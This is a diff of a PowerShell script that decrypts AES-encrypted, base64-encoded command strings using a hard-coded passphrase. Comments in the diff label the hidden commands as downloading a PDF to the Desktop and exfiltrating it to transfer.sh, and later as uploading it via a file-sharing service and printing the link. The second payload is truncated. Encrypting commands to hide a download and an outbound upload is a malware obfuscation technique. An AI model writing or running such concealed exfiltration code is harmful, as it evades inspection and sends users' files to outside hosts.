@@ -7,35 +7,40 @@ function Decrypt-String {
     )
 
     # 1) force $Password to exactly 32 chars
-    $padded = ($Password.PadRight(32)).Substring(0,32)
+    $padded    = ($Password.PadRight(32)).Substring(0,32)
     # 2) UTF8 bytes → 256-bit key
-    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($padded)
+    $keyBytes  = [System.Text.Encoding]::UTF8.GetBytes($padded)
     # 3) zero IV
-    $iv = New-Object byte[] 16
+    $iv        = New-Object byte[] 16
 
-    # 4) decrypt
-    $cipher = [Convert]::FromBase64String($CipherTextBase64)
-    $aes    = [System.Security.Cryptography.Aes]::Create()
+    # 4) decrypt the blob
+    $cipherBytes = [Convert]::FromBase64String($CipherTextBase64)
+    $aes         = [System.Security.Cryptography.Aes]::Create()
     $aes.Mode    = 'CBC'
     $aes.Padding = 'PKCS7'
     $aes.Key     = $keyBytes
     $aes.IV      = $iv
 
     $decryptor = $aes.CreateDecryptor()
-    $ms        = New-Object System.IO.MemoryStream(,$cipher)
-    $cs        = New-Object System.Security.Cryptography.CryptoStream($ms, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)
-    $sr        = New-Object System.IO.StreamReader($cs)
-    $plain     = $sr.ReadToEnd()
-
+    $ms        = New-Object System.IO.MemoryStream(,$cipherBytes)
+    $cs        = New-Object System.Security.Cryptography.CryptoStream(
+                     $ms, $decryptor,
+                     [System.Security.Cryptography.CryptoStreamMode]::Read
+                  )
+    $sr    = New-Object System.IO.StreamReader($cs)
+    $plain = $sr.ReadToEnd()
     $sr.Close(); $cs.Close(); $ms.Close()
     return $plain
 }
 
 $EncryptedCommands = @(
-    # Download PDF to Desktop
-    'XOrF7CWwIx3XQlYmCDZ0IlAw0Tfjd5X8zLMGfK0IJRsbfCggr8CwuCSqK3Oji6/ebCBKtwXei5sR/rTVZNgOQHxRWjwA8GpATiglV5nByR6FpCQtSzagJulryWJU7FgY+QpQXQuFwgLgl+ZFTFCs+jERUYoKfx5/NuiqxESECCr7pCsK+dStuXptNeYd6yOOo7ZFl0BStvHFuj8n2NCy6l/kU04PREcjDjbryrZgKXPJZjsuWYjt3iXRpKfnFPERuN9/XgQgQ5tPz/7LcjkeRA==',
-    # Exfil to transfer.sh
-    'XOrF7CWwIx3XQlYmCDZ0IlAw0Tfjd5X8zLMGfK0IJRsbfCggr8CwuCSqK3Oji6/ebCBKtwXei5sR/rTVZNgOQMUfIr03ZrFxbmrXoJ23NErI2equaL0sMzdmWf+RBEUB9YUibUdB1x/yxJ14qGjB1CSPdE/1FQN79GV5KvWAdXENMDNW8c5THME6qoMsLltX6XNb/oIAlx1xjEbQBsZeS+wfTzVtC8UVPnjOlA6i1qCtxek1D4a14bLsEg/QzafQTwnJ6/64B3s4ja02CdswOA=='
+    # ── 1) Pull the HaveIBeenPwned PDF to Desktop
+    '1Afgn9y2LnD1emDCHXVtgp5NoG/P8A1Q3YeXkUhfofXaUWAHOBJrHBlZdbOrwi8r0f3hBr4Ti8oXZ+sPbS6OQ3TAX69OG/P8KLnlxxiCRe80p3rcC0MEfcfptEc8a5ArI6EbYG7gpzt4Fy5qv0vrJ0r88L23o5j6wZ0lrCkcdSrh2xdN/OVF3pto96vlBsl7v7BaUEYGDN2cR3fVdl99HMu81EzXc2QumH72fyUCtlN/uYMm0lsPYUs3Vor+Fk1fOYGTDPMyNxz4VVMf4JHeIQ==',
+
+    # ── 2) Upload it via Free Transfert and print the link
+    @'
++fgFEVKw2c9FsziwCau4Sx3cgiRC8LPnV+/Cu+OCOdt10iXUGcIJhkKk6HfdWSiuint0C6l5jRSW5B5j9tBx68Kw2iApUJsjNhECDBxNRht4Wodp4b6kXh+vLmzTbvUzT/A0VEPDqumSvHkMCMghYfxQTDic4upA2qpu0ayj9N/FdH2Q9HpP/E5wAWPEdptYGRaCWVl/kWqjm5I5shk1QsqRzgbRMY3NpyteDkbOY/R3wGODwWL/59aUfPfhT5893VAEE7KOP6pXka4nLzNnsbu78LRMF1hkxLNJDhnOnbgZIogd7bQPJKSOnfSPSCeEZUAN9khtwsfvQvrsbPIV4r1S174bZj5ZmwZ4fM7Umcb2MqRImNirusv9Dwn5DIiS1GNyQIB9iE4GxoPnucZddg8A6Koss6wRQov0gcmkBxvDASBqcS7BdO0sG/8mfBOeX6/eiWJfBKHQ9RVyHi2jr4quN03Y3qW3zCtkkGH+rAb4l+dJ/GL1HP6DjJwan26lv1GooKgL+IPlB/iaB/uDCFrti5pKDRygUH0IDW2dZJc+Y3iWddRMiiGGFs0MxFJCz9zBePx/rFcu1pvFxG6AGr1ylo51gHWzmbc0PhC8aeQf39O3HfGqAEi6PCCIF8dW5nAuS1VJT6SdP4V8Yhel1SKujpoxQSMREAEiG78mij6/UyJae6BXHf2npRlx42ovpmyDQLqtP5IK1ytAYHgkXbPQ2RgaX19a1P3MD48W45XlWhiw5P18pnSlM7iqmruUnSXdpqcw/1zyLWCehmEaEAAuPdexn/9mKsbYgjnJHmnXeA24PLaWi9REXFUTKBO4AzBePx/rFcu1pvFxG6AGr1ylo51gHWzmbc0PhC8aeQf39O3HfGqAEi6PCCIF8dW5nAuS1VJT6SdP4V8Yhel1SKujpoxQSMREAEiG78mij6/UyJae6BXHf2npRlx42ovpmyDQLqtP5IK1ytAYHgkXbPQ2RgaX19a1P3MD48W45XlWhiw5P18pnSlM7iqmruUnSXdpqcw/1zyLW...
+'@
 )
 
 $passphrase = 'Junade Ali'
